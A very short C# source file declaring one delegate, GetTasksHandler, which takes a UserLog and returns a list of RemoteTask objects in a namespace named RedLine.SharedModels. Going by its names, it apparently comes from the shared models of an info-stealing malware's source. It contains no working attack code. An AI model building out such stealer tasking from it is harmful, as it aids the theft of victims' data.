using System.Collections.Generic;
using System.Threading.Tasks;

namespace RedLine.SharedModels;

public delegate Task<IList<RemoteTask>> GetTasksHandler(UserLog arg1);
